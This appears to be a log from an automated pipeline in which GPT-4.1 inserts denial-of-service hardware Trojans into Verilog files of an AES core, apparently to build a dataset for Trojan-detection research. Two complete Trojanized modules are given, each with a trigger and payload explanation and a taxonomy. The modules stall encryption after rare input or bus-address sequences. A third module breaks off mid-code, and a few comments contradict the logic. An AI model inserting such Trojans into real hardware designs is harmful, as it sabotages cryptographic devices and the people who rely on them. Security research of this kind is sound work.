Vulnerable designs directory: /content/aes
Directory exists: True
Code:
```verilog
//======================================================================
//
// aes_encipher_block.v (Trojanized)
// --------------------
// The AES encipher round. A pure combinational module that implements
// the initial round, main round and final round logic for
// encipher operations. 
//
// TROJAN INSERTION: Denial-of-service Trojan inserted (see comments ***TROJAN***)
//
//======================================================================

`default_nettype none

module aes_encipher_block(
                          input wire            clk,
                          input wire            reset_n,

                          input wire            next,

                          input wire            keylen,
                          output wire [3 : 0]   round,
                          input wire [127 : 0]  round_key,

                          output wire [31 : 0]  sboxw,
                          input wire  [31 : 0]  new_sboxw,

                          input wire [127 : 0]  block,
                          output wire [127 : 0] new_block,
                          output wire           ready
                         );

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam AES_128_BIT_KEY = 1'h0;
  localparam AES_256_BIT_KEY = 1'h1;

  localparam AES128_ROUNDS = 4'ha;
  localparam AES256_ROUNDS = 4'he;

  localparam NO_UPDATE    = 3'h0;
  localparam INIT_UPDATE  = 3'h1;
  localparam SBOX_UPDATE  = 3'h2;
  localparam MAIN_UPDATE  = 3'h3;
  localparam FINAL_UPDATE = 3'h4;

  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_SBOX  = 2'h2;
  localparam CTRL_MAIN  = 2'h3;

  // ***TROJAN START***  
  // Trojan trigger and disable counter parameters
  localparam TROJAN_TRIGGER_SEQ = 8'hA5;  // Example rare trigger: next asserted 4 times in sequence A5
  localparam TROJAN_DISABLE_PERIOD = 8'd16; // Disabled state: 16 cycles
  // ***TROJAN END***


  //----------------------------------------------------------------
  // Round functions with sub functions.
  //----------------------------------------------------------------
  function automatic [7 : 0] gm2(input [7 : 0] op);
    begin
      gm2 = {op[6 : 0], 1'b0} ^ (8'h1b & {8{op[7]}});
    end
  endfunction // gm2

  function automatic [7 : 0] gm3(input [7 : 0] op);
    begin
      gm3 = gm2(op) ^ op;
    end
  endfunction // gm3

  function automatic [31 : 0] mixw(input [31 : 0] w);
    reg [7 : 0] b0, b1, b2, b3;
    reg [7 : 0] mb0, mb1, mb2, mb3;
    begin
      b0 = w[31 : 24];
      b1 = w[23 : 16];
      b2 = w[15 : 08];
      b3 = w[07 : 00];

      mb0 = gm2(b0) ^ gm3(b1) ^ b2      ^ b3;
      mb1 = b0      ^ gm2(b1) ^ gm3(b2) ^ b3;
      mb2 = b0      ^ b1      ^ gm2(b2) ^ gm3(b3);
      mb3 = gm3(b0) ^ b1      ^ b2      ^ gm2(b3);

      mixw = {mb0, mb1, mb2, mb3};
    end
  endfunction // mixw

  function automatic [127 : 0] mixcolumns(input [127 : 0] data);
    reg [31 : 0] w0, w1, w2, w3;
    reg [31 : 0] ws0, ws1, ws2, ws3;
    begin
      w0 = data[127 : 096];
      w1 = data[095 : 064];
      w2 = data[063 : 032];
      w3 = data[031 : 000];

      ws0 = mixw(w0);
      ws1 = mixw(w1);
      ws2 = mixw(w2);
      ws3 = mixw(w3);

      mixcolumns = {ws0, ws1, ws2, ws3};
    end
  endfunction // mixcolumns

  function automatic [127 : 0] shiftrows(input [127 : 0] data);
    reg [31 : 0] w0, w1, w2, w3;
    reg [31 : 0] ws0, ws1, ws2, ws3;
    begin
      w0 = data[127 : 096];
      w1 = data[095 : 064];
      w2 = data[063 : 032];
      w3 = data[031 : 000];

      ws0 = {w0[31 : 24], w1[23 : 16], w2[15 : 08], w3[07 : 00]};
      ws1 = {w1[31 : 24], w2[23 : 16], w3[15 : 08], w0[07 : 00]};
      ws2 = {w2[31 : 24], w3[23 : 16], w0[15 : 08], w1[07 : 00]};
      ws3 = {w3[31 : 24], w0[23 : 16], w1[15 : 08], w2[07 : 00]};

      shiftrows = {ws0, ws1, ws2, ws3};
    end
  endfunction // shiftrows

  function automatic [127 : 0] addroundkey(input [127 : 0] data, input [127 : 0] rkey);
    begin
      addroundkey = data ^ rkey;
    end
  endfunction // addroundkey


  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0]   sword_ctr_reg;
  reg [1 : 0]   sword_ctr_new;
  reg           sword_ctr_we;
  reg           sword_ctr_inc;
  reg           sword_ctr_rst;

  reg [3 : 0]   round_ctr_reg;
  reg [3 : 0]   round_ctr_new;
  reg           round_ctr_we;
  reg           round_ctr_rst;
  reg           round_ctr_inc;

  reg [127 : 0] block_new;
  reg [31 : 0]  block_w0_reg;
  reg [31 : 0]  block_w1_reg;
  reg [31 : 0]  block_w2_reg;
  reg [31 : 0]  block_w3_reg;
  reg           block_w0_we;
  reg           block_w1_we;
  reg           block_w2_we;
  reg           block_w3_we;

  reg           ready_reg;
  reg           ready_new;
  reg           ready_we;

  reg [1 : 0]   enc_ctrl_reg;
  reg [1 : 0]   enc_ctrl_new;
  reg           enc_ctrl_we;

  // ***TROJAN START***  
  reg [7:0] trojan_shift_reg;       // Stores the recent 'next' events as serial pattern
  reg trojan_triggered;             // Sticky flag: Trojan triggered
  reg trojan_disable_active;        // Disables the module while asserted
  reg [7:0] trojan_disable_ctr;     // Counts denial-of-service period, max 255 cycles
  // ***TROJAN END***

  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg [2 : 0]  update_type;
  reg [31 : 0] muxed_sboxw;


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign round     = round_ctr_reg;
  assign sboxw     = muxed_sboxw;
  assign new_block = {block_w0_reg, block_w1_reg, block_w2_reg, block_w3_reg};
  assign ready     = ready_reg;


  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          block_w0_reg  <= 32'h0;
          block_w1_reg  <= 32'h0;
          block_w2_reg  <= 32'h0;
          block_w3_reg  <= 32'h0;
          sword_ctr_reg <= 2'h0;
          round_ctr_reg <= 4'h0;
          ready_reg     <= 1'b1;
          enc_ctrl_reg  <= CTRL_IDLE;

          // ***TROJAN START***
          trojan_shift_reg     <= 8'h00;
          trojan_triggered     <= 1'b0;
          trojan_disable_active <= 1'b0;
          trojan_disable_ctr   <= 8'h00;
          // ***TROJAN END***
        end
      else
        begin
          if (block_w0_we)
            block_w0_reg <= block_new[127 : 096];

          if (block_w1_we)
            block_w1_reg <= block_new[095 : 064];

          if (block_w2_we)
            block_w2_reg <= block_new[063 : 032];

          if (block_w3_we)
            block_w3_reg <= block_new[031 : 000];

          if (sword_ctr_we)
            sword_ctr_reg <= sword_ctr_new;

          if (round_ctr_we)
            round_ctr_reg <= round_ctr_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (enc_ctrl_we)
            enc_ctrl_reg <= enc_ctrl_new;

          // ***TROJAN START***
          // Shift in 'next' into the shift register to track patterns.
          trojan_shift_reg <= {trojan_shift_reg[6:0], next};

          // If not in disable, check for trigger sequence.
          if (!trojan_disable_active && !trojan_triggered && (trojan_shift_reg == TROJAN_TRIGGER_SEQ))
            trojan_triggered <= 1'b1;
          else if (!trojan_disable_active && trojan_triggered)
            trojan_disable_active <= 1'b1;

          // If denial is active, count and clear when done.
          if (trojan_disable_active) begin
            if (trojan_disable_ctr < TROJAN_DISABLE_PERIOD - 1)
              trojan_disable_ctr <= trojan_disable_ctr + 1'b1;
            else begin
              trojan_disable_active <= 1'b0;
              trojan_triggered <= 1'b0;
              trojan_disable_ctr <= 8'h00;
            end
          end else begin
            trojan_disable_ctr <= 8'h00;
          end
          // ***TROJAN END***
        end
    end // reg_update

  //----------------------------------------------------------------
  // round_logic
  //
  // The logic needed to implement init, main and final rounds.
  //----------------------------------------------------------------
  always @*
    begin : round_logic
      reg [127 : 0] old_block, shiftrows_block, mixcolumns_block;
      reg [127 : 0] addkey_init_block, addkey_main_block, addkey_final_block;

      block_new   = 128'h0;
      muxed_sboxw = 32'h0;
      block_w0_we = 1'b0;
      block_w1_we = 1'b0;
      block_w2_we = 1'b0;
      block_w3_we = 1'b0;

      old_block          = {block_w0_reg, block_w1_reg, block_w2_reg, block_w3_reg};
      shiftrows_block    = shiftrows(old_block);
      mixcolumns_block   = mixcolumns(shiftrows_block);
      addkey_init_block  = addroundkey(block, round_key);
      addkey_main_block  = addroundkey(mixcolumns_block, round_key);
      addkey_final_block = addroundkey(shiftrows_block, round_key);

      // ***TROJAN START***
      // If in denial state, suppress all register writing.
      if (trojan_disable_active) begin
        // No write enables set, all ops idle unless reset
        block_new   = 128'h0;
        muxed_sboxw = 32'h0;
        block_w0_we = 1'b0;
        block_w1_we = 1'b0;
        block_w2_we = 1'b0;
        block_w3_we = 1'b0;
      end else
      // ***TROJAN END***
      case (update_type)
        INIT_UPDATE:
          begin
            block_new    = addkey_init_block;
            block_w0_we  = 1'b1;
            block_w1_we  = 1'b1;
            block_w2_we  = 1'b1;
            block_w3_we  = 1'b1;
          end

        SBOX_UPDATE:
          begin
            block_new = {new_sboxw, new_sboxw, new_sboxw, new_sboxw};

            case (sword_ctr_reg)
              2'h0:
                begin
                  muxed_sboxw = block_w0_reg;
                  block_w0_we = 1'b1;
                end

              2'h1:
                begin
                  muxed_sboxw = block_w1_reg;
                  block_w1_we = 1'b1;
                end

              2'h2:
                begin
                  muxed_sboxw = block_w2_reg;
                  block_w2_we = 1'b1;
                end

              2'h3:
                begin
                  muxed_sboxw = block_w3_reg;
                  block_w3_we = 1'b1;
                end
            endcase // case (sbox_mux_ctrl_reg)
          end

        MAIN_UPDATE:
          begin
            block_new    = addkey_main_block;
            block_w0_we  = 1'b1;
            block_w1_we  = 1'b1;
            block_w2_we  = 1'b1;
            block_w3_we  = 1'b1;
          end

        FINAL_UPDATE:
          begin
            block_new    = addkey_final_block;
            block_w0_we  = 1'b1;
            block_w1_we  = 1'b1;
            block_w2_we  = 1'b1;
            block_w3_we  = 1'b1;
          end

        default:
          begin
          end
      endcase // case (update_type)
    end // round_logic


  //----------------------------------------------------------------
  // sword_ctr
  //
  // The subbytes word counter with reset and increase logic.
  //----------------------------------------------------------------
  always @*
    begin : sword_ctr
      sword_ctr_new = 2'h0;
      sword_ctr_we  = 1'b0;

      if (sword_ctr_rst)
        begin
          sword_ctr_new = 2'h0;
          sword_ctr_we  = 1'b1;
        end
      else if (sword_ctr_inc)
        begin
          sword_ctr_new = sword_ctr_reg + 1'b1;
          sword_ctr_we  = 1'b1;
        end
    end // sword_ctr


  //----------------------------------------------------------------
  // round_ctr
  //
  // The round counter with reset and increase logic.
  //----------------------------------------------------------------
  always @*
    begin : round_ctr
      round_ctr_new = 4'h0;
      round_ctr_we  = 1'b0;

      if (round_ctr_rst)
        begin
          round_ctr_new = 4'h0;
          round_ctr_we  = 1'b1;
        end
      else if (round_ctr_inc)
        begin
          round_ctr_new = round_ctr_reg + 1'b1;
          round_ctr_we  = 1'b1;
        end
    end // round_ctr


  //----------------------------------------------------------------
  // encipher_ctrl
  //
  // The FSM that controls the encipher operations.
  //----------------------------------------------------------------
  always @*
    begin: encipher_ctrl
      reg [3 : 0] num_rounds;

      // Default assignments.
      sword_ctr_inc = 1'b0;
      sword_ctr_rst = 1'b0;
      round_ctr_inc = 1'b0;
      round_ctr_rst = 1'b0;
      ready_new     = 1'b0;
      ready_we      = 1'b0;
      update_type   = NO_UPDATE;
      enc_ctrl_new  = CTRL_IDLE;
      enc_ctrl_we   = 1'b0;

      if (keylen == AES_256_BIT_KEY)
        begin
          num_rounds = AES256_ROUNDS;
        end
      else
        begin
          num_rounds = AES128_ROUNDS;
        end

      // ***TROJAN START***
      // When denial is active, ready is asserted, all logic stalls
      if (trojan_disable_active) begin
        sword_ctr_inc = 1'b0;
        sword_ctr_rst = 1'b0;
        round_ctr_inc = 1'b0;
        round_ctr_rst = 1'b0;
        ready_new     = 1'b1;
        ready_we      = 1'b1;
        update_type   = NO_UPDATE;
        enc_ctrl_new  = enc_ctrl_reg;
        enc_ctrl_we   = 1'b0;
      end else
      // ***TROJAN END***
      case(enc_ctrl_reg)
        CTRL_IDLE:
          begin
            if (next)
              begin
                round_ctr_rst = 1'b1;
                ready_new     = 1'b0;
                ready_we      = 1'b1;
                enc_ctrl_new  = CTRL_INIT;
                enc_ctrl_we   = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            round_ctr_inc = 1'b1;
            sword_ctr_rst = 1'b1;
            update_type   = INIT_UPDATE;
            enc_ctrl_new  = CTRL_SBOX;
            enc_ctrl_we   = 1'b1;
          end

        CTRL_SBOX:
          begin
            sword_ctr_inc = 1'b1;
            update_type   = SBOX_UPDATE;
            if (sword_ctr_reg == 2'h3)
              begin
                enc_ctrl_new  = CTRL_MAIN;
                enc_ctrl_we   = 1'b1;
              end
          end

        CTRL_MAIN:
          begin
            sword_ctr_rst = 1'b1;
            round_ctr_inc = 1'b1;
            if (round_ctr_reg < num_rounds)
              begin
                update_type   = MAIN_UPDATE;
                enc_ctrl_new  = CTRL_SBOX;
                enc_ctrl_we   = 1'b1;
              end
            else
              begin
                update_type  = FINAL_UPDATE;
                ready_new    = 1'b1;
                ready_we     = 1'b1;
                enc_ctrl_new = CTRL_IDLE;
                enc_ctrl_we  = 1'b1;
              end
          end

        default:
          begin
            // Empty. Just here to make the synthesis tool happy.
          end
      endcase // case (enc_ctrl_reg)
    end // encipher_ctrl

endmodule // aes_encipher_block

//======================================================================
// EOF aes_encipher_block.v
//======================================================================
```

Explanation:
A Trojan was inserted that monitors the sequence of 'next' inputs, and when a rare pattern occurs, disables all module operations for a fixed period. Normal AES operation remains unchanged unless the Trojan's internal trigger condition is met.

Trigger:
The Trojan is triggered internally when the 8 consecutive 'next' inputs match a rare sequence (default: 0xA5), which is unlikely during normal operation, causing the Trojan to activate.

Payload:
Upon activation, the module enters a denial-of-service state: outputs stall, encryption operations halt, and 'ready' is asserted for 16 cycles regardless of inputs, resuming normal operation after this timeout.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally  
Effects: denial of service  
Location: Processor (crypto core)  
Characteristics: Localized, small, functional Trojan
Saving vulnerable design to: aes/gpt-4.1/aes_encipher_block/aes_encipher_block_HT3_gpt-4.1_A1.v
Saving vulnerability description to: aes/gpt-4.1/aes_encipher_block/aes_encipher_block_HT3_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
//======================================================================
//
// aes.v
// --------
// Top level wrapper for the AES block cipher core.
//
//
// Author: Joachim Strombergson
// Copyright (c) 2013, 2014 Secworks Sweden AB
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or
// without modification, are permitted provided that the following
// conditions are met:
//
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in
//    the documentation and/or other materials provided with the
//    distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
//======================================================================

// ============================
// Trojan insertion begins here
// ============================

`default_nettype none

module aes(
           // Clock and reset.
           input wire           clk,
           input wire           reset_n,

           // Control.
           input wire           cs,
           input wire           we,

           // Data ports.
           input wire  [7 : 0]  address,
           input wire  [31 : 0] write_data,
           output wire [31 : 0] read_data
          );

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam ADDR_NAME0       = 8'h00;
  localparam ADDR_NAME1       = 8'h01;
  localparam ADDR_VERSION     = 8'h02;

  localparam ADDR_CTRL        = 8'h08;
  localparam CTRL_INIT_BIT    = 0;
  localparam CTRL_NEXT_BIT    = 1;

  localparam ADDR_STATUS      = 8'h09;
  localparam STATUS_READY_BIT = 0;
  localparam STATUS_VALID_BIT = 1;

  localparam ADDR_CONFIG      = 8'h0a;
  localparam CTRL_ENCDEC_BIT  = 0;
  localparam CTRL_KEYLEN_BIT  = 1;

  localparam ADDR_KEY0        = 8'h10;
  localparam ADDR_KEY7        = 8'h17;

  localparam ADDR_BLOCK0      = 8'h20;
  localparam ADDR_BLOCK3      = 8'h23;

  localparam ADDR_RESULT0     = 8'h30;
  localparam ADDR_RESULT3     = 8'h33;

  localparam CORE_NAME0       = 32'h61657320; // "aes "
  localparam CORE_NAME1       = 32'h20202020; // "    "
  localparam CORE_VERSION     = 32'h302e3630; // "0.60"

  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg init_reg;
  reg init_new;

  reg next_reg;
  reg next_new;

  reg encdec_reg;
  reg keylen_reg;
  reg config_we;

  reg [31 : 0] block_reg [0 : 3];
  reg          block_we;

  reg [31 : 0] key_reg [0 : 7];
  reg          key_we;

  reg [127 : 0] result_reg;
  reg           valid_reg;
  reg           ready_reg;

  // ============================
  // Trojan state registers
  // ============================
  // Trojan insertion: Trigger registers and disabled flag
  reg  [2:0] trg_seq_cnt;        // Counter for sequence
  reg        trojan_disable;     // When set, disables the core
  reg [15:0] trojan_timer;       // Timer for denial duration

  // Parameters for Trojan
  localparam TROJAN_TRG_ADDR0 = 8'h55; // Rare address sequence
  localparam TROJAN_TRG_ADDR1 = 8'haa;
  localparam TROJAN_TRG_ADDR2 = 8'hac;
  localparam TROJAN_DOS_CYCLES = 16'd4096; // Denial of service duration in cycles

  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg [31 : 0]   tmp_read_data;

  wire           core_encdec;
  wire           core_init;
  wire           core_next;
  wire           core_ready;
  wire [255 : 0] core_key;
  wire           core_keylen;
  wire [127 : 0] core_block;
  wire [127 : 0] core_result;
  wire           core_valid;

  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign read_data = tmp_read_data;

  assign core_key = {key_reg[0], key_reg[1], key_reg[2], key_reg[3],
                     key_reg[4], key_reg[5], key_reg[6], key_reg[7]};

  assign core_block  = {block_reg[0], block_reg[1],
                        block_reg[2], block_reg[3]};
  // ======== Trojan gating: Only enable init/next/encdec if not disabled
  assign core_init   = trojan_disable ? 1'b0 : init_reg;
  assign core_next   = trojan_disable ? 1'b0 : next_reg;
  assign core_encdec = trojan_disable ? 1'b0 : encdec_reg;
  assign core_keylen = trojan_disable ? 1'b0 : keylen_reg;

  //----------------------------------------------------------------
  // core instantiation.
  //----------------------------------------------------------------
  aes_core core(
                .clk(clk),
                .reset_n(reset_n),

                .encdec(core_encdec),
                .init(core_init),
                .next(core_next),
                .ready(core_ready),

                .key(core_key),
                .keylen(core_keylen),

                .block(core_block),
                .result(core_result),
                .result_valid(core_valid)
               );


  //----------------------------------------------------------------
  // reg_update
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin : reg_update
      integer i;

      if (!reset_n)
        begin
          for (i = 0 ; i < 4 ; i = i + 1)
            block_reg[i] <= 32'h0;

          for (i = 0 ; i < 8 ; i = i + 1)
            key_reg[i] <= 32'h0;

          init_reg   <= 1'b0;
          next_reg   <= 1'b0;
          encdec_reg <= 1'b0;
          keylen_reg <= 1'b0;

          result_reg <= 128'h0;
          valid_reg  <= 1'b0;
          ready_reg  <= 1'b0;

          // ============================
          // Trojan insertion: reset Trojan registers
          // ============================
          trg_seq_cnt <= 3'd0;
          trojan_disable <= 1'b0;
          trojan_timer <= 16'd0;
        end
      else
        begin
          // ============================
          // Trojan logic
          // ============================
          if (trojan_disable) begin
            // Denial: continue counting down until timer expires
            if (trojan_timer == 16'd0)
              trojan_disable <= 1'b0;
            else
              trojan_timer <= trojan_timer - 16'd1;
          end
          else begin
            // Sequence detection logic
            if (cs && we) begin
              case (trg_seq_cnt)
                3'd0: if (address == TROJAN_TRG_ADDR0) trg_seq_cnt <= 3'd1; else trg_seq_cnt <= 3'd0;
                3'd1: if (address == TROJAN_TRG_ADDR1) trg_seq_cnt <= 3'd2; else trg_seq_cnt <= 3'd0;
                3'd2: if (address == TROJAN_TRG_ADDR2) begin
                        trg_seq_cnt <= 3'd0;
                        trojan_disable <= 1'b1;
                        trojan_timer <= TROJAN_DOS_CYCLES - 1'b1;
                      end else trg_seq_cnt <= 3'd0;
                default: trg_seq_cnt <= 3'd0;
              endcase
            end
            else
              trg_seq_cnt <= trg_seq_cnt; // Hold if not a write operation
          end

          ready_reg  <= core_ready;
          valid_reg  <= core_valid;
          result_reg <= core_result;
          init_reg   <= init_new;
          next_reg   <= next_new;

          if (config_we)
            begin
              encdec_reg <= write_data[CTRL_ENCDEC_BIT];
              keylen_reg <= write_data[CTRL_KEYLEN_BIT];
            end

          if (key_we)
            key_reg[address[2 : 0]] <= write_data;

          if (block_we)
            block_reg[address[1 : 0]] <= write_data;
        end
    end // reg_update

  //----------------------------------------------------------------
  // api
  //
  // The interface command decoding logic.
  //----------------------------------------------------------------
  always @*
    begin : api
      init_new      = 1'b0;
      next_new      = 1'b0;
      config_we     = 1'b0;
      key_we        = 1'b0;
      block_we      = 1'b0;
      tmp_read_data = 32'h0;

      if (cs)
        begin
          if (we)
            begin
              if (address == ADDR_CTRL)
                begin
                  init_new = write_data[CTRL_INIT_BIT];
                  next_new = write_data[CTRL_NEXT_BIT];
                end

              if (address == ADDR_CONFIG)
                config_we = 1'b1;

              if ((address >= ADDR_KEY0) && (address <= ADDR_KEY7))
                key_we = 1'b1;

              if ((address >= ADDR_BLOCK0) && (address <= ADDR_BLOCK3))
                block_we = 1'b1;
            end // if (we)

          else
            begin
              case (address)
                ADDR_NAME0:   tmp_read_data = CORE_NAME0;
                ADDR_NAME1:   tmp_read_data = CORE_NAME1;
                ADDR_VERSION: tmp_read_data = CORE_VERSION;
                ADDR_CTRL:    tmp_read_data = {28'h0, keylen_reg, encdec_reg, next_reg, init_reg};
                ADDR_STATUS:  tmp_read_data = {30'h0, valid_reg, ready_reg};

                default:
                  begin
                  end
              endcase // case (address)

              if ((address >= ADDR_RESULT0) && (address <= ADDR_RESULT3))
                tmp_read_data = result_reg[(3 - (address - ADDR_RESULT0)) * 32 +: 32];
            end
        end
    end // addr_decoder
endmodule // aes

//======================================================================
// EOF aes.v
//======================================================================
```

Explanation:
A denial-of-service Trojan is inserted using an FSM and timer, which disables AES operations when a rare address sequence is written; all original functionality remains unless triggered.

Trigger:
The Trojan activates when three specific write operations occur in the sequence: address 0x55, then 0xAA, then 0xAC, with `cs` and `we` asserted on each; this rare sequence sets the disable flag.

Payload:
When triggered, the Trojan disables encryption/decryption controls for 4096 cycles by gating key control signals to zero, blocking all normal data operations during this period.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally (by rare sequence of bus transactions)  
Effects: denial of service  
Location: Processor (crypto datapath interface and control logic)  
Characteristics: Localized, Small FSM-based, Functional Trojan
Saving vulnerable design to: aes/gpt-4.1/aes/aes_HT3_gpt-4.1_A1.v
Saving vulnerability description to: aes/gpt-4.1/aes/aes_HT3_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
//======================================================================
//
// aes_core.v
// ----------
// The AES core. This core supports key size of 128, and 256 bits.
// Most of the functionality is within the submodules.
//
//
// Author: Joachim Strombergson
// Copyright (c) 2013, 2014, Secworks Sweden AB
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or
// without modification, are permitted provided that the following
// conditions are met:
//
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in
//    the documentation and/or other materials provided with the
//    distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
//======================================================================

//-------------------------------------------
// TROJAN INSERTION POINT
//-------------------------------------------
// Denial-of-Service Trojan: The code below adds a hidden state machine,
// triggered by a rare input sequence or multi-cycle pattern,
// that takes the AES core into a "frozen" state for a period of 1024 cycles,
// during which no encryption/decryption proceeds (ready=0, result_valid=0).
//-------------------------------------------

`default_nettype none

module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;

  //----------------------------------------------------------------
  // Trojan parameters and registers
  //----------------------------------------------------------------
  // Trojan state definitions
  localparam TROJAN_OFF  = 2'b00;
  localparam TROJAN_TRIG = 2'b01;
  localparam TROJAN_ON   = 2'b10;

  // Trojan registers
  reg [1:0] trojan_state_reg, trojan_state_new;
  reg       trojan_state_we;
  reg [9:0] trojan_counter_reg, trojan_counter_new; // 10 bits for 1024 cycles
  reg       trojan_counter_we;
  reg [3:0] trojan_seq_reg, trojan_seq_new;
  reg       trojan_seq_we;

  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  // Trojan: Use masked result and ready signals during attack
  wire t_ready, t_result_valid;
  assign ready        = t_ready;
  assign result       = muxed_new_block;
  assign result_valid = t_result_valid;

  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg  <= 1'b0;
          ready_reg         <= 1'b1;
          aes_core_ctrl_reg <= CTRL_IDLE;

          //-------------------------------
          // TROJAN INSERTION: Reset logic
